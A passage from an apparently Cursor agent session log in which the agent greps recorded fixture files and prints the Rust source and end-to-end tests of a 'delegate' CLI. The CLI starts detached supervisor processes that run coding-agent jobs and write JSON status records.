y terminal status; `answer_delegation` only `NEEDS_CONTEXT`. → **file resume, any terminal**\\n- `status_record_path` uses `cursor-delegate-jobs`; #4/#7 use `delegate-jobs`. → **rename with #7**\\n- Disk writes bare `PollResult`; #7 needs `supervisorPid`, `heartbeatAt`, `resume {…}`. → **#7 record extensions**\\n- `ResumeContext` keeps MCP fields (`isolation`, `verifyCommands`, `allowPartialCommit`); #4 resume stash is slimmer. → **store spec fields only**\\n- `Capability`/`capability.rs` still Plan/Write; #4 is `read-only`/`read-write`. → **CLI names + mapping**\\n- Cross-backend rejection implie [... omitted end of long line]","contentTruncated":false,"isContextLine":false}]},{"file":"./tests/fixtures/cursor/preflight-7.stdout","matches":[{"lineNumber":2,"content":"{\"type\":\"user\",\"message\":{\"role\":\"user\",\"content\":[{\"type\":\"text\",\"text\":\"Read-only doc preflight. Do not edit anything. Do not delegate further.\\n\\nRead GitHub issue #7 (`gh issue view 7`) and spec #4 (`gh issue view 4`, plus its comments for the probe findings), then the existing code it builds on: src/status_record.rs, src/runner.rs, src/job_registry.rs, src/stream.rs, src/finalize.rs, src/prompt.rs, src/models.rs, src/capability.rs, tests/e2e.rs, Cargo.toml.\\n\\nList, max 250 words total, one line each:\\n1. Contradictions between #7, #4 and the existing code.\\n2. Defaults or formats nothing states but the lane must pick (job id format, status-record path and JSON shape, heartbeat interval, watch output format, watch exit code on timeout, where the binary target lives).\\n3. Failure cases with no stated behaviour or error output.\\n4. Acceptance criteria that fight the spec or the code.\\nFor each, give your recommended ruling in a few words. End with STATUS line.\\n\\nEnd your final mess [... omitted end of long line]","contentTruncated":false,"isContextLine":false},{"lineNumber":4,"content":"{\"type\":\"thinking\",\"subtype\":\"delta\",\"text\":\" preflight review of\",\"session_id\":\"36627d89-4873-4238-8376-e9782bc73a39\",\"timestamp_ms\":1790842905294}","contentTruncated":false,"isContextLine":false},{"lineNumber":79,"content":"{\"type\":\"thinking\",\"subtype\":\"delta\",\"text\":\" the preflight review.\",\"session_id\":\"36627d89-4873-4238-8376-e9782bc73a39\",\"timestamp_ms\":1790842915598}","contentTruncated":false,"isContextLine":false}]},{"file":"./tests/fixtures/cursor/ponytail-18.stdout","matches":[{"lineNumber":29,"content":"{\"type\":\"tool_call\",\"subtype\":\"completed\",\"call_id\":\"tool_b8262cdc-6d85-43ef-a66a-e72f7baec2b\",\"tool_call\":{\"shellToolCall\":{\"args\":{\"command\":\"gh pr view 18 --repo user/delegate --json files,title,body 2>&1 | head -200\",\"workingDirectory\":\"\",\"timeout\":30000,\"toolCallId\":\"tool_b8262cdc-6d85-43ef-a66a-e72f7baec2b\",\"simpleCommands\":[\"gh\",\"head\"],\"hasInputRedirect\":false,\"hasOutputRedirect\":true,\"parsingResult\":{\"parsingFailed\":false,\"executableCommands\":[{\"name\":\"gh\",\"args\":[{\"type\":\"word\",\"value\":\"pr\"},{\"type\":\"word\",\"value\":\"view\"},{\"type\":\"number\",\"value\":\"18\"},{\"type\":\"word\",\"value\":\"--repo\"},{\"type\":\"word\",\"value\":\"user/delegate\"},{\"type\":\"word\",\"value\":\"--json\"},{\"type\":\"word\",\"value\":\"files,title,body\"}],\"fullText\":\"gh pr view 18 --repo user/delegate --json files,title,body\"},{\"name\":\"head\",\"args\":[{\"type\":\"number\",\"value\":\"-200\"}],\"fullText\":\"head -200\"}],\"hasRedirects\":true,\"hasCommandSubstitution\":false,\"allRedirectsAreDevNull\":true,\"redirects\":[{\"operator\":\">&\",\"destinationFds [... omitted end of long line]","contentTruncated":false,"isContextLine":false},{"lineNumber":74,"content":"{\"type\":\"tool_call\",\"subtype\":\"completed\",\"call_id\":\"tool_71333a62-cd62-4d47-9660-63e0780fc41\",\"tool_call\":{\"grepToolCall\":{\"args\":{\"pattern\":\"record\\\\.sh\",\"path\":\"/Users/user/.cursor/projects/Users-user-work-delegate-6-record-fixtures/agent-tools/119c6ec8-e9e6-42c3-adef-5753f728adc1.txt\",\"caseInsensitive\":false,\"headLimit\":20,\"multiline\":false,\"toolCallId\":\"tool_71333a62-cd62-4d47-9660-63e0780fc41\",\"offset\":0},\"result\":{\"success\":{\"pattern\":\"record\\\\.sh\",\"path\":\"\",\"outputMode\":\"content\",\"workspaceResults\":{\"/Users/user/work/delegate-6-record-fixtures\":{\"content\":{\"matches\":[{\"file\":\"./tests/fixtures/cursor/ponytail-18.stdout\",\"matches\":[{\"lineNumber\":29,\"content\":\"{\\\"type\\\":\\\"tool_call\\\",\\\"subtype\\\":\\\"completed\\\",\\\"call_id\\\":\\\"tool_b8262cdc-6d85-43ef-a66a-e72f7baec2b\\\",\\\"tool_call\\\":{\\\"shellToolCall\\\":{\\\"args\\\":{\\\"command\\\":\\\"gh pr view 18 --repo user/delegate --json files,title,body 2>&1 | head -200\\\",\\\"workingDirectory\\\":\\\"\\\",\\\"timeout\\\":30000,\\\"toolCallId\\\":\\\"tool_b8262cdc-6d85-43e [... omitted end of long line]","contentTruncated":false,"isContextLine":false},{"lineNumber":153,"content":"{\"type\":\"thinking\",\"subtype\":\"delta\",\"text\":\" such as preflight-7\",\"session_id\":\"04dee1e2-96f1-4825-9926-d7d625c11b45\",\"timestamp_ms\":1790843258459}","contentTruncated":false,"isContextLine":false},{"lineNumber":184,"content":"{\"type\":\"thinking\",\"subtype\":\"delta\",\"text\":\" stay. The `preflight-7`\",\"session_id\":\"04dee1e2-96f1-4825-9926-d7d625c11b45\",\"timestamp_ms\":1790843258464}","contentTruncated":false,"isContextLine":false},{"lineNumber":190,"content":"{\"type\":\"thinking\",\"subtype\":\"delta\",\"text\":\"\\n\\nThe PR contains no test runner changes, so the extra fixtures may be unused scaffolding. Lane-8-ci, preflight-7, and ponytail-19 likely belong to future parsers and exceed the current scope.\",\"session_id\":\"04dee1e2-96f1-4825-9926-d7d625c11b45\",\"timestamp_ms\":1790843258464}","contentTruncated":false,"isContextLine":false},{"lineNumber":193,"content":"{\"type\":\"tool_call\",\"subtype\":\"started\",\"call_id\":\"tool_2471c17c-a098-49b2-b4b4-6ec5343cef3\",\"tool_call\":{\"grepToolCall\":{\"args\":{\"pattern\":\"preflight-7|lane-8|ponytail-19|review-19\",\"path\":\"/Users/user/work/delegate-6-record-fixtures\",\"caseInsensitive\":false,\"multiline\":false,\"toolCallId\":\"tool_2471c17c-a098-49b2-b4b4-6ec5343cef3\",\"offset\":0}},\"hookAdditionalContexts\":[],\"toolCallId\":\"tool_2471c17c-a098-49b2-b4b4-6ec5343cef3\",\"startedAtMs\":\"1790843258535\"},\"model_call_id\":\"19994692-c4a5-4e36-9bd5-317371d067e3-10-a0cj\",\"session_id\":\"04dee1e2-96f1-4825-9926-d7d625c11b45\",\"timestamp_ms\":1790843258465}","contentTruncated":false,"isContextLine":false},{"lineNumber":194,"content":"{\"type\":\"tool_call\",\"subtype\":\"completed\",\"call_id\":\"tool_2471c17c-a098-49b2-b4b4-6ec5343cef3\",\"tool_call\":{\"grepToolCall\":{\"args\":{\"pattern\":\"preflight-7|lane-8|ponytail-19|review-19\",\"path\":\"/Users/user/work/delegate-6-record-fixtures\",\"caseInsensitive\":false,\"multiline\":false,\"toolCallId\":\"tool_2471c17c-a098-49b2-b4b4-6ec5343cef3\",\"offset\":0},\"result\":{\"success\":{\"pattern\":\"preflight-7|lane-8|ponytail-19|review-19\",\"path\":\"/Users/user/work/delegate-6-record-fixtures\",\"outputMode\":\"content\",\"workspaceResults\":{\"/Users/user/work/delegate-6-record-fixtures\":{\"content\":{\"matches\":[{\"file\":\"./tests/fixtures/cursor/ponytail-18.stdout\",\"matches\":[{\"lineNumber\":29,\"content\":\"{\\\"type\\\":\\\"tool_call\\\",\\\"subtype\\\":\\\"completed\\\",\\\"call_id\\\":\\\"tool_b8262cdc-6d85-43ef-a66a-e72f7baec2b\\\",\\\"tool_call\\\":{\\\"shellToolCall\\\":{\\\"args\\\":{\\\"command\\\":\\\"gh pr view 18 --repo user/delegate --json files,title,body 2>&1 | head -200\\\",\\\"workingDirectory\\\":\\\"\\\",\\\"timeout\\\":30000,\\\"toolCallId\\\":\\\"tool_b8262cdc-6d8 [... omitted end of long line]","contentTruncated":false,"isContextLine":false},{"lineNumber":248,"content":"{\"type\":\"thinking\",\"subtype\":\"delta\",\"text\":\" variants, preflight-7,\",\"session_id\":\"04dee1e2-96f1-4825-9926-d7d625c11b45\",\"timestamp_ms\":1790843275076}","contentTruncated":false,"isContextLine":false},{"lineNumber":275,"content":"{\"type\":\"thinking\",\"subtype\":\"delta\",\"text\":\"\\n\\nThe preflight-7 capture\",\"session_id\":\"04dee1e2-96f1-4825-9926-d7d625c11b45\",\"timestamp_ms\":1790843275080}","contentTruncated":false,"isContextLine":false},{"lineNumber":302,"content":"{\"type\":\"assistant\",\"message\":{\"role\":\"assistant\",\"content\":[{\"type\":\"text\",\"text\":\"**PR #18 over-engineering (scripts + fixture scope)**\\n\\n- `scripts/record.sh:24` — cut orchestrator STATUS paragraph baked into `prompt=\\\"$(cat)\\\"` — replace with a single-line `prompt=\\\"$(cat)\\\"`.\\n- `scripts/record.sh:56` — cut `.argv` from the `jq`/`sed` redaction loop — replace with `sed \\\"s/$USER/user/g\\\"` on argv only (stdout/stderr keep `jq`).\\n- `tests/fixtures/cursor/preflight-7.stdout:1` — cut ~300-line preflight probe with no test consumer in this PR — replace with re-record when #7/parser tests need it.\\n- `tests/fixtures/cursor/lane-8-ci.stdout:1` — cut `lane-8-ci` + `lane-8-ci-repair` pair — replace with fixtures landed with CI work (#8), not the #6 matrix.\\n- `tests/fixtures/cursor/ponytail-19.stdout:1` — cut ad-hoc review/ponytail captures — replace with the ~22-run matrix described in the PR body only.\\n- `tests/fixtures/claude/review-19.stdout:1` — cut ditto — replace with matrix case [... omitted end of long line]","contentTruncated":false,"isContextLine":false},{"lineNumber":303,"content":"{\"type\":\"result\",\"subtype\":\"success\",\"duration_ms\":61768,\"duration_api_ms\":61768,\"is_error\":false,\"result\":\"Fetching PR #18 diff and scanning changed files for over-engineering.\\n\\n\\n**PR #18 over-engineering (scripts + fixture scope)**\\n\\n- `scripts/record.sh:24` — cut orchestrator STATUS paragraph baked into `prompt=\\\"$(cat)\\\"` — replace with a single-line `prompt=\\\"$(cat)\\\"`.\\n- `scripts/record.sh:56` — cut `.argv` from the `jq`/`sed` redaction loop — replace with `sed \\\"s/$USER/user/g\\\"` on argv only (stdout/stderr keep `jq`).\\n- `tests/fixtures/cursor/preflight-7.stdout:1` — cut ~300-line preflight probe with no test consumer in this PR — replace with re-record when #7/parser tests need it.\\n- `tests/fixtures/cursor/lane-8-ci.stdout:1` — cut `lane-8-ci` + `lane-8-ci-repair` pair — replace with fixtures landed with CI work (#8), not the #6 matrix.\\n- `tests/fixtures/cursor/ponytail-19.stdout:1` — cut ad-hoc review/ponytail captures — replace with the ~22-run matrix described in the [... omitted end of long line]","contentTruncated":false,"isContextLine":false}]},{"file":"./tests/fixtures/claude/review-19.stdout","matches":[{"lineNumber":9,"content":"{\"type\":\"system\",\"subtype\":\"commands_changed\",\"commands\":[{\"name\":\"autonomous-flywheel\",\"description\":\"Flywheel unattended multi-PR landing: implement, triage CI, merge on green, morning report. Fires when asked to land a stack of PRs unattended or continue a flywheel session. (user)\",\"argumentHint\":\"\"},{\"name\":\"clear-communication\",\"description\":\"Write and edit prose in GOV.UK / GDS style — plain English, active voice, front-loaded, sentence case, no bold/italic emphasis. Use when writing or editing reports, research write-ups, guidance, documentation, summaries, or any prose where clarity and accessibility matter. (user)\",\"argumentHint\":\"\"},{\"name\":\"code-review\",\"description\":\"Review the changes since a fixed point (commit, branch, tag, or merge-base) along two axes: Standards (does the code follow this repo's documented coding standards?) and Spec (does the code match what the originating issue/spec asked for?). Runs both reviews in parallel sub-agents and reports them side by side. [... omitted end of long line]","contentTruncated":false,"isContextLine":false}]},{"file":"./tests/fixtures/claude/review-18.stdout","matches":[{"lineNumber":15,"content":"{\"type\":\"user\",\"message\":{\"role\":\"user\",\"content\":[{\"tool_use_id\":\"toolu_01HGCobLa7Nx9QjMUKTdjMFz\",\"type\":\"tool_result\",\"content\":\"title:\\ttest: recording script and redacted headless fixtures (#6)\\nstate:\\tDRAFT\\nauthor:\\tuser (Amogh Akshintala)\\nlabels:\\t\\nassignees:\\t\\nreviewers:\\t\\nprojects:\\t\\nmilestone:\\t\\nnumber:\\t18\\nurl:\\thttps://github.com/user/delegate/pull/18\\nadditions:\\t1972\\ndeletions:\\t0\\nauto-merge:\\tdisabled\\n--\\nFixes #6\\n\\n- `scripts/record.sh BACKEND MODEL CAPABILITY NAME [CWD] [SESSION] < prompt` runs one prompt through cursor-agent, pi or claude with the flags spec #4 assigns. It writes `tests/fixtures/<backend>/NAME.{stdout,stderr,argv}`. `CANCEL_AFTER=N` records a run cancelled with SIGTERM.\\n- `scripts/redact.jq` strips the recording user's setup (pi system-prompt sections and extension tool schemas; Claude init lists and hook output). The home-directory name is replaced with `user`.\\n- 22 recorded runs across cursor, pi and Claude: plain answer, tool calls, r [... omitted end of long line]","contentTruncated":false,"isContextLine":false},{"lineNumber":29,"content":"{\"type\":\"user\",\"message\":{\"role\":\"user\",\"content\":[{\"type\":\"tool_result\",\"content\":\"Exit code 1\\n21:The tool has also grown more surface than it uses. Across 413 real `cursor_run` calls, every one ran in the background, `plan` capability was never used, `allowPartialCommit` and `idleMs` were never set, `cursor_wait_any` ran twice, and several parameters (`verifyCommands`, `promptPreamble`, `requireNonClaude`, the `allowUnsandboxed` second signal) only add prompt text or guard against cases that never happen. Eight MCP tools and fourteen run parameters cost schema tokens in every session and make the skill long.\\n60:28. As an orchestrating agent, I want resume to reuse the job's model, directory, capability and gate, so that I cannot forget a setting on the follow-up.\\n73:41. As a user, I want cursor read-write runs unsandboxed, so that delegates can clone, push and open PRs.\\n79:47. As a user, I want my existing host profile moved to the new config location by setup, so that my setting [... omitted end of long line]","contentTruncated":false,"isContextLine":false}]},{"file":"./tests/fixtures/claude/plan-plain-answer.stdout","matches":[{"lineNumber":9,"content":"{\"type\":\"system\",\"subtype\":\"commands_changed\",\"commands\":[{\"name\":\"autonomous-flywheel\",\"description\":\"Flywheel unattended multi-PR landing: implement, triage CI, merge on green, morning report. Fires when asked to land a stack of PRs unattended or continue a flywheel session. (user)\",\"argumentHint\":\"\"},{\"name\":\"clear-communication\",\"description\":\"Write and edit prose in GOV.UK / GDS style — plain English, active voice, front-loaded, sentence case, no bold/italic emphasis. Use when writing or editing reports, research write-ups, guidance, documentation, summaries, or any prose where clarity and accessibility matter. (user)\",\"argumentHint\":\"\"},{\"name\":\"code-review\",\"description\":\"Review the changes since a fixed point (commit, branch, tag, or merge-base) along two axes: Standards (does the code follow this repo's documented coding standards?) and Spec (does the code match what the originating issue/spec asked for?). Runs both reviews in parallel sub-agents and reports them side by side. [... omitted end of long line]","contentTruncated":false,"isContextLine":false}]}],"totalLines":71,"totalMatchedLines":71,"clientTruncated":false,"ripgrepTruncated":false}}}}}},"hookAdditionalContexts":[],"toolCallId":"tool_f4f3840b-9e43-416d-b2c2-1d69e3f2c3a","startedAtMs":"1790845569264","completedAtMs":"1790845570033"},"model_call_id":"13e7813c-8061-40d0-a475-19ebe85b4952-0-mjpw","session_id":"7dd612d0-6469-4d8d-870b-f50c14f3831a","timestamp_ms":1790845570012}
{"type":"tool_call","subtype":"completed","call_id":"tool_38d6db7b-9648-45fa-8fea-ad5b5049dda","tool_call":{"shellToolCall":{"args":{"command":"cd /Users/user/work/delegate-fixtures && git show origin/main:src/cli.rs 2>/dev/null | head -200; echo \"---E2E---\"; git show origin/main:tests/cli_e2e.rs 2>/dev/null | head -150","workingDirectory":"","timeout":30000,"toolCallId":"tool_38d6db7b-9648-45fa-8fea-ad5b5049dda","simpleCommands":["cd","git","head","echo","git","head"],"hasInputRedirect":false,"hasOutputRedirect":true,"parsingResult":{"parsingFailed":false,"executableCommands":[{"name":"cd","args":[{"type":"word","value":"/Users/user/work/delegate-fixtures"}],"fullText":"cd /Users/user/work/delegate-fixtures"},{"name":"git","args":[{"type":"word","value":"show"},{"type":"word","value":"origin/main:src/cli.rs"}],"fullText":"git show origin/main:src/cli.rs"},{"name":"head","args":[{"type":"number","value":"-200"}],"fullText":"head -200"},{"name":"echo","args":[{"type":"string","value":"\"---E2E---\""}],"fullText":"echo \"---E2E---\""},{"name":"git","args":[{"type":"word","value":"show"},{"type":"word","value":"origin/main:tests/cli_e2e.rs"}],"fullText":"git show origin/main:tests/cli_e2e.rs"},{"name":"head","args":[{"type":"number","value":"-150"}],"fullText":"head -150"}],"hasRedirects":true,"hasCommandSubstitution":false,"allRedirectsAreDevNull":true,"redirects":[{"operator":">","destinationFds":[2],"targetNodeType":"word","targetText":"/dev/null"},{"operator":">","destinationFds":[2],"targetNodeType":"word","targetText":"/dev/null"}]},"fileOutputThresholdBytes":"40000","isBackground":false,"skipApproval":false,"timeoutBehavior":"TIMEOUT_BEHAVIOR_BACKGROUND","hardTimeout":86400000,"description":"Show cli.rs and cli_e2e.rs from origin/main","closeStdin":true,"conversationId":"7dd612d0-6469-4d8d-870b-f50c14f3831a","adminCommandDenylist":[],"requestId":"13e7813c-8061-40d0-a475-19ebe85b4952"},"result":{"success":{"command":"cd /Users/user/work/delegate-fixtures && git show origin/main:src/cli.rs 2>/dev/null | head -200; echo \"---E2E---\"; git show origin/main:tests/cli_e2e.rs 2>/dev/null | head -150","workingDirectory":"","exitCode":0,"signal":"","stdout":"//! The `delegate` CLI: `run` starts a detached supervisor, `watch` reads job records.\n//! The record file under `$TMPDIR/delegate-jobs/` is the only link between them.\n\nuse crate::backends::cursor::make_cursor_adapter;\nuse crate::capability::map_capability;\nuse crate::git::capture_head;\nuse crate::index::build_deps;\nuse crate::job_registry::{JobRegistry, RegistryDeps, WaitOpts};\nuse crate::models::resolve_model;\nuse crate::prompt::status_block;\nuse crate::runner::build_argv;\nuse crate::status_record::{CliRecordWriter, cli_record_path};\nuse crate::types::{Capability, JobSpec, ResumeContext};\nuse crate::util::{random_uuid, resolve_path};\nuse std::io::{Read, Write};\nuse std::os::unix::fs::OpenOptionsExt;\nuse std::os::unix::process::CommandExt;\nuse std::process::{Command, Stdio};\nuse std::sync::Arc;\nuse std::time::{Duration, Instant};\n\nconst USAGE: &str = \"usage: delegate run --model M [--capability read-only|read-write] [--cwd D] [--prompt-file F]\\n       delegate watch <jobId>... [--timeout S]\";\n\n/// Bad input: reason on stderr, exit 2.\nstruct Usage(String);\n\nfn usage<T>(msg: impl Into<String>) -> Result<T, Usage> {\n    Err(Usage(msg.into()))\n}\n\npub fn main() -> i32 {\n    let args: Vec<String> = std::env::args().skip(1).collect();\n    let res = match args.first().map(String::as_str) {\n        Some(\"run\") => run(&args[1..]),\n        Some(\"watch\") => watch(&args[1..]),\n        Some(\"__supervise\") => return supervise(&args[1..]),\n        _ => usage(USAGE),\n    };\n    match res {\n        Ok(code) => code,\n        Err(Usage(m)) => {\n            eprintln!(\"{m}\");\n            2\n        }\n    }\n}\n\n/// Splits `--flag value` pairs from positionals.\nfn parse(args: &[String], flags: &[&str]) -> Result<(Vec<(String, String)>, Vec<String>), Usage> {\n    let (mut kv, mut pos) = (vec![], vec![]);\n    let mut it = args.iter();\n    while let Some(a) = it.next() {\n        if a.starts_with(\"--\") {\n            if !flags.contains(&a.as_str()) {\n                return usage(format!(\"unknown flag {a}\\n{USAGE}\"));\n            }\n            let Some(v) = it.next() else {\n                return usage(format!(\"{a} needs a value\"));\n            };\n            kv.push((a.clone(), v.clone()));\n        } else {\n            pos.push(a.clone());\n        }\n    }\n    Ok((kv, pos))\n}\n\nfn flag<'a>(kv: &'a [(String, String)], name: &str) -> Option<&'a str> {\n    kv.iter().find(|(k, _)| k == name).map(|(_, v)| v.as_str())\n}\n\nfn capability(name: &str) -> Result<(Capability, &'static str), Usage> {\n    match name {\n        \"read-only\" => Ok((Capability::Ask, \"read-only\")),\n        \"read-write\" => Ok((Capability::WriteUnsandboxed, \"read-write\")),\n        o => usage(format!(\n            \"unknown capability {o}: use read-only or read-write\"\n        )),\n    }\n}\n\nfn run(args: &[String]) -> Result<i32, Usage> {\n    let (kv, _) = parse(args, &[\"--model\", \"--capability\", \"--cwd\", \"--prompt-file\"])?;\n    let Some(model) = flag(&kv, \"--model\") else {\n        return usage(\"--model is required\");\n    };\n    let cap_name = flag(&kv, \"--capability\").unwrap_or(\"read-only\");\n    capability(cap_name)?;\n    let deps = match build_deps() {\n        Ok(d) => d,\n        Err(e) => {\n            eprintln!(\"{e}\");\n            return Ok(1);\n        }\n    };\n    if resolve_model(Some(model), false, &deps.config).is_err() {\n        let mut ids: Vec<_> = deps.config.models.keys().cloned().collect();\n        ids.sort();\n        return usage(format!(\n            \"unknown model {model}; valid models: {}\",\n            ids.join(\", \")\n        ));\n    }\n    let mut prompt = String::new();\n    match flag(&kv, \"--prompt-file\") {\n        Some(f) => prompt = std::fs::read_to_string(f).map_err(|e| Usage(format!(\"{f}: {e}\")))?,\n        None => {\n            let _ = std::io::stdin().read_to_string(&mut prompt);\n        }\n    }\n    if prompt.trim().is_empty() {\n        return usage(\"prompt is empty\");\n    }\n    let cwd = match flag(&kv, \"--cwd\") {\n        Some(d) => resolve_path(d),\n        None => std::env::current_dir()\n            .map(|p| p.to_string_lossy().into_owned())\n            .map_err(|e| Usage(e.to_string()))?,\n    };\n    if !std::path::Path::new(&cwd).is_dir() {\n        return usage(format!(\"cwd {cwd} is not a directory\"));\n    }\n\n    let id = random_uuid();\n    let record = cli_record_path(&id);\n    let dir = record.parent().expect(\"record has a parent\");\n    std::fs::create_dir_all(dir).map_err(|e| Usage(format!(\"{}: {e}\", dir.display())))?;\n    let prompt_file = dir.join(format!(\"{id}.prompt\"));\n    let written = std::fs::OpenOptions::new()\n        .write(true)\n        .create_new(true)\n        .mode(0o600)\n        .open(&prompt_file)\n        .and_then(|mut f| f.write_all(prompt.as_bytes()));\n    if let Err(e) = written {\n        let _ = std::fs::remove_file(&prompt_file);\n        return usage(format!(\"{}: {e}\", prompt_file.display()));\n    }\n\n    // Own session and process group, stdio closed: the supervisor outlives this process.\n    let mut child = unsafe {\n        Command::new(std::env::current_exe().map_err(|e| Usage(e.to_string()))?)\n            .args([\"__supervise\", &id, model, cap_name, &cwd])\n            .stdin(Stdio::null())\n            .stdout(Stdio::null())\n            .stderr(Stdio::null())\n            .pre_exec(|| {\n                libc::setsid();\n                Ok(())\n            })\n            .spawn()\n    }\n    .map_err(|e| {\n        let _ = std::fs::remove_file(&prompt_file);\n        Usage(format!(\"cannot start supervisor: {e}\"))\n    })?;\n    // The supervisor writes the first RUNNING record before the agent starts; wait for it.\n    let t = Instant::now();\n    while !record.exists() {\n        if child.try_wait().ok().flatten().is_some() || t.elapsed() > Duration::from_secs(10) {\n            let _ = std::fs::remove_file(&prompt_file);\n            eprintln!(\"supervisor failed to write {}\", record.display());\n            return Ok(1);\n        }\n        std::thread::sleep(Duration::from_millis(10));\n    }\n    println!(\"{id}\");\n    Ok(0)\n}\n\n/// The detached half of `run`: drives one job, keeping its record fresh until it ends.\nfn supervise(args: &[String]) -> i32 {\n    let [id, model, cap_name, cwd] = args else {\n        return 2;\n    };\n    let fail = |m: String| {\n        eprintln!(\"{m}\");\n        1\n    };\n    let (cap, cap_label) = match capability(cap_name) {\n        Ok(c) => c,\n        Err(Usage(m)) => return fail(m),\n    };\n    let deps = match build_deps() {\n        Ok(d) => d,\n        Err(e) => return fail(e.to_string()),\n    };\n    let config = deps.config;\n    let prompt_file = cli_record_path(id).with_extension(\"prompt\");\n    let Ok(prompt) = std::fs::read_to_string(&prompt_file) else {\n        return fail(format!(\"cannot read {}\", prompt_file.display()));\n    };\n    let _ = std::fs::remove_file(&prompt_file);\n    let prompt = format!(\"{prompt}\\n\\n---\\n\\n{}\", status_block()).replace('\\0', \"\");\n\n    let capres = map_capability(cap, true);\n    let argv = build_argv(model, &capres.flags, &[], None, &prompt);\n    let spec = JobSpec {\n        bin: crate::cursor_bin::resolve_cursor_bin(None),\n        argv,\n---E2E---\n//! Drives the real `delegate` binary as a process against a fake cursor-agent.\n\nuse serde_json::Value;\nuse std::io::Write;\nuse std::os::unix::fs::PermissionsExt;\nuse std::path::{Path, PathBuf};\nuse std::process::{Command, Output, Stdio};\nuse std::time::{Duration, Instant};\n\nconst FAKE_AGENT: &str = r#\"#!/bin/sh\nprintf '%s\\n' \"$@\" > \"$(dirname \"$0\")/argv.txt\"\nprintf '%s\\n' '{\"type\":\"tool_call\",\"subtype\":\"started\",\"tool_call\":{\"shellToolCall\":{\"args\":{\"command\":\"ls\"}}}}'\ncase \"$*\" in\n  *SLOW*) i=0; while [ ! -e \"$(dirname \"$0\")/go\" ] && [ $i -lt 200 ]; do sleep 0.05; i=$((i+1)); done ;;\nesac\ncase \"$*\" in\n  *ASKME*) printf '%s\\n' '{\"type\":\"result\",\"subtype\":\"success\",\"is_error\":false,\"result\":\"Which db?\\nSTATUS: NEEDS_CONTEXT\",\"session_id\":\"s-2\"}' ;;\n  *) printf '%s\\n' '{\"type\":\"result\",\"subtype\":\"success\",\"is_error\":false,\"result\":\"391\\nSTATUS: DONE\",\"session_id\":\"s-1\"}' ;;\nesac\n\"#;\n\nstruct Env {\n    dir: PathBuf,\n}\n\nimpl Env {\n    fn new(name: &str) -> Self {\n        let dir = std::env::temp_dir().join(format!(\"cdm-cli-{name}-{}\", std::process::id()));\n        let _ = std::fs::remove_dir_all(&dir);\n        std::fs::create_dir_all(&dir).unwrap();\n        let agent = dir.join(\"agent.sh\");\n        std::fs::write(&agent, FAKE_AGENT).unwrap();\n        std::fs::set_permissions(&agent, std::fs::Permissions::from_mode(0o755)).unwrap();\n        Env { dir }\n    }\n\n    /// Lets SLOW jobs finish; until then they stay RUNNING (10s cap).\n    fn release(&self) {\n        std::fs::write(self.dir.join(\"go\"), \"\").unwrap();\n    }\n\n    fn argv(&self) -> Vec<String> {\n        let s = std::fs::read_to_string(self.dir.join(\"argv.txt\")).unwrap();\n        s.lines().map(String::from).collect()\n    }\n\n    fn delegate(&self, args: &[&str], stdin: Option<&str>) -> Output {\n        let mut child = Command::new(env!(\"CARGO_BIN_EXE_delegate\"))\n            .args(args)\n            .current_dir(&self.dir)\n            .env(\"TMPDIR\", &self.dir)\n            .env(\"CURSOR_AGENT_BIN\", self.dir.join(\"agent.sh\"))\n            .env(\"DELEGATE_HEARTBEAT_MS\", \"100\")\n            .stdin(Stdio::piped())\n            .stdout(Stdio::piped())\n            .stderr(Stdio::piped())\n            .spawn()\n            .unwrap();\n        let mut si = child.stdin.take().unwrap();\n        if let Some(s) = stdin {\n            si.write_all(s.as_bytes()).unwrap();\n        }\n        drop(si);\n        child.wait_with_output().unwrap()\n    }\n\n    /// Starts a job and returns its id.\n    fn run(&self, prompt: &str) -> String {\n        let out = self.delegate(&[\"run\", \"--model\", \"composer-2.5\"], Some(prompt));\n        assert!(\n            out.status.success(),\n            \"{}\",\n            String::from_utf8_lossy(&out.stderr)\n        );\n        String::from_utf8(out.stdout).unwrap().trim().to_string()\n    }\n\n    fn record(&self, id: &str) -> Value {\n        let p: PathBuf = self.dir.join(\"delegate-jobs\").join(format!(\"{id}.json\"));\n        serde_json::from_str(&std::fs::read_to_string(p).unwrap()).unwrap()\n    }\n\n    fn wait_terminal(&self, id: &str) -> Value {\n        let out = self.delegate(&[\"watch\", id, \"--timeout\", \"10\"], None);\n        assert_eq!(out.status.code(), Some(0));\n        serde_json::from_slice(&out.stdout).unwrap()\n    }\n}\n\nimpl Drop for Env {\n    fn drop(&mut self) {\n        let _ = std::fs::remove_dir_all(&self.dir);\n    }\n}\n\nfn alive(pid: i64) -> bool {\n    unsafe { libc::kill(pid as i32, 0) == 0 }\n}\n\nfn until(what: &str, mut f: impl FnMut() -> bool) {\n    let t = Instant::now();\n    while !f() {\n        assert!(t.elapsed() < Duration::from_secs(10), \"timed out: {what}\");\n        std::thread::sleep(Duration::from_millis(20));\n    }\n}\n\n#[test]\nfn run_returns_id_while_job_runs_then_it_finishes() {\n    let e = Env::new(\"run\");\n    let id = e.run(\"SLOW do it\");\n    assert_eq!(id.len(), 36);\n    let r = e.record(&id);\n    assert_eq!(r[\"status\"], \"RUNNING\");\n    assert_eq!(r[\"resume\"][\"model\"], \"composer-2.5\");\n    assert_eq!(r[\"resume\"][\"capability\"], \"read-only\");\n    assert_eq!(r[\"resume\"][\"sessionId\"], Value::Null);\n    let pid = r[\"supervisorPid\"].as_i64().unwrap();\n    assert!(alive(pid), \"supervisor must outlive `run`\");\n    e.release();\n\n    let done = e.wait_terminal(&id);\n    let argv = e.argv();\n    assert!(argv.windows(2).any(|w| w == [\"--mode\", \"ask\"]), \"{argv:?}\");\n    assert!(argv.contains(&\"--force\".to_string()), \"{argv:?}\");\n    assert_eq!(done[\"status\"], \"DONE\");\n    assert_eq!(done[\"result\"][\"text\"], \"391\\nSTATUS: DONE\");\n    assert_eq!(done[\"result\"][\"jobId\"], id.as_str());\n    assert_eq!(done[\"resume\"][\"sessionId\"], \"s-1\");\n    until(\"supervisor exit\", || !alive(pid));\n}\n\n#[test]\nfn running_record_heartbeat_advances() {\n    let e = Env::new(\"hb\");\n    let id = e.run(\"SLOW\");\n    let a = e.record(&id)[\"lastHeartbeatAt\"].as_f64().unwrap();\n    until(\"heartbeat\", || {\n        let r = e.record(&id);\n        r[\"status\"] != \"RUNNING\" || r[\"lastHeartbeatAt\"].as_f64().unwrap() > a\n    });\n    assert_ne!(\n        e.record(&id)[\"status\"],\n        \"DONE\",\n        \"heartbeat must advance while RUNNING\"\n    );\n    e.release();\n    e.wait_terminal(&id);\n}\n\n","stderr":"","executionTime":833,"interleavedOutput":"//! The `delegate` CLI: `run` starts a detached supervisor, `watch` reads job records.\n//! The record file under 